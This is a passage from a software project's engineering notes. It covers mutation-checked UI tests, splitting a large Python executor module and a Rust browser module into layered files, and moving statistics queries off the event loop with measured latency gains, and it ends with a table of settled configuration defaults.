mounts the App and checks that the weather is one layer under the chrome and outside the transcript, is the same element after the first message, and is told the agent is working while a turn runs; `stateReactiveWeather.test.ts` runs the shared clock and the rain's own loop a frame at a time (`canvasRig.ts` supplies a manual frame clock, a recording context and a canvas with a size) and holds the rate's easing, its 1.8x ceiling, the rain's integer grid and un-synchronised columns, that every weather effect changes what it draws when `active` does, and the motion decision; `canvasRecovery.test.ts` drives both loops through a lost and restored context, a painter that throws every frame, a compositor too slow to animate on, and a hidden window. Each was checked by breaking the source (42 mutations across the two loops, the hook, the App and the motion store), and each mutation failed the test named for it. `atmosphere` and `rainBackdrop` stay on the list as `text`, for what is written in the stylesheet and in the painters' files. The estimate that stood here before this round (about 14 need the mounted App, about 9 a single component) was made by reading test names and was too high; several were already mounted.

**4.2 Modularisation, after 4.1.** Both files are split along the seams the code already has; neither is split before its self-reading tests are converted.

- `engine/executor.py` — **done**: it is 71 lines now, the assembly of `ExecutorService`, and the class is one object built from layers in a linear chain where each layer calls only those below it, so every attribute a layer reads is declared in a layer beneath it and mypy checks the lot without stubs (the file was 5,777 lines; `ExecutorService` alone was 3,950, 83 methods). `executor_core` (685 lines: the state, the stage measurement, the status and step writes, the failure path, and the two methods the pipeline used to call back up into, `_approval_withdrawn` and `_test_result`) ← `executor_evidence` (501: the librarian and the pack) ← `executor_design` (769: the design stage, the brand contract and its drift check, the deliverables, which carries the DRAFT RECONSTRUCTION notice the old header held) ← `executor_plan` (285) and `executor_steps` (1,231: fixer, verifier, critic, scribe, retry, apply) ← `executor_conduct` (1,039: a chat turn and the conductor driving a plan). Outside the class: `executor_support` (124: the exceptions a stage can end with and `STAGE_OUTCOMES`), `agent_orchestrator` (578) and `conductor_tools` (742), which had no coupling to the service's state. It was done in the order this note proposed, one commit per step, `make test`, ruff and mypy run after each, and no test edited except where a moved method's home is named: `test_metrics` re-derives the published stages from every layer's source (`ExecutorService.__mro__`) instead of the last layer's body, and `test_workspace_knowledge` patches the shared `read_knowledge` mock under both modules that look it up. `engine.executor` still re-exports `ExecutorService`, `STAGE_OUTCOMES`, `_as_prose` and every other name the repo imports from it. One cast remains: `ConductorTools` is typed against the whole `ExecutorService`, and the conductor layer hands it `self`; the tools call 23 members across every layer, so a protocol would only restate the class. The lint exemptions followed the code, each with a reason in `pyproject.toml` (`executor_core`: S110, S608; `executor_steps`: S101; `agent_orchestrator`: S110), and `engine/executor.py` needs none.
- `src-tauri/src/browser.rs` — **done**: it is `src-tauri/src/browser/` now. `mod.rs` keeps labels and seat policy, the navigation guard, `open`, the user agent and the page operations (about 860 lines); `page_layer.rs` is the GTK container work (about 280); `smoke.rs` is the embed smoke driver and the JavaScript it injects (about 920); `tests.rs` is the 2,100 lines of tests. `lib.rs` and `webview_bridge.rs` name `browser::` paths, which `pub use smoke::*` keeps working. The constraint recorded here before the split was that 22 tests `include_str!` the file, so a split would make them fail or, worse, pass vacuously. They now read `production_source()`, which concatenates the three shipped files and never `tests.rs` — and asserts, per file, that a marker only that file holds is present, so a file that stops contributing fails loudly instead of turning every absence check into a pass. Two consequences worth knowing. The crate-wide scan that no code can hand a URL to the operating system's browser read `src/*.rs` non-recursively, so a module that is a directory would have left it unscanned without a word; it now recurses, skips `tests.rs` (whose tests name the strings), and asserts it reached `browser/mod.rs`, `browser/page_layer.rs` and `browser/smoke.rs`. And a dangling doc comment describing a system-browser hand-off that was deleted long ago, attached to `smoke_mode`, is gone. The smoke JavaScript was **not** moved into `.js` files under `include_str!` as proposed above: `tests/test_embed_probe.py` and several Rust tests assert on fragments of it as Rust source, and moving it is a separate change with its own reason.

**4.3 Stats off the event loop — done, and measured.** Both sweeps are capped (`_sweep_stats`: 5,000 goals and 20,000 events; `_sweep_metrics`: 20,000 events), so the cost plateaus rather than grows — but a plateau of a couple of hundred milliseconds is still a latency stall for every goal streaming at the same moment. It was recorded here as "do this if the cap is raised or a stall is seen"; it is done, because leaving a measured stall in place is not a decision anyone wanted. The read (query, JSON parse) runs on a worker thread over a second connection that is opened there, set `query_only`, and closed there (`_read_off_the_loop`; WAL lets it read while the engine writes, and the engine commits every write, so it sees them); the arithmetic (`build_overview`, `stage_costs`, `role_success_rate`, `failure_breakdown`) follows it onto a thread. The engine's own connection stays the only writer and stays on the loop, and a store with no file to open twice (an in-memory one) is read where it is. Measured at the documented scale, 300,000 stored events, as how late a 1 ms timer fires while the route is being served:

| route | longest the loop was held, before | after |
|---|---|---|
| `/stats/failures` | 221 ms | 28 ms |
| `/stats/overview` | 565 ms | 64 ms |

The overview was worse than the 145 ms first estimated: it sweeps twice, and its snapshot check (`maybe_snapshot`, which runs on every read to see whether a past day is unfrozen) formatted a date for every one of 20,000 events on every call — 40 to 100 ms for nothing once a day was frozen. `active_days` now buckets timestamps to whole UTC days first and formats only the distinct days. What is left is not a stall: the two threads share the interpreter's lock, so the loop sometimes waits a few milliseconds for its turn while a worker parses (median lateness 0.2 ms, 99th percentile about 26 ms). A process pool would remove even that and was not worth its weight. `tests/test_stats_off_the_loop.py` asserts where the work runs and that a blocked read leaves the loop free, rather than a timing. Event retention is deliberately not part of this: `events` is the audit trail, and deleting it is a product decision.

## 4. Settled defaults

| Topic | Decision |
|---|---|
| `system_prompt_override` | Free-text, **32768** chars. Blank → `NULL` / `DEFAULT_PROMPTS`. |
| Reviewer → Coder | Human click: `POST /goals/{id}/steps/{step_id}/retry`. No auto-loop. |
| `max_calls_per_goal` | Not on `AgentConfig`. Tester: at most one argv run + one verdict call per step attempt. |
| SQLite path | `~/.codify/codify.db` — or `CODIFY_DB` / `CODIFY_HOME`, resolved in `engine/home.py` only. |
| Redirected run | Never touches the real keychain (`04` §2.0). |

Argv table, WS/auth handshake, HTTP catalog: `04`.
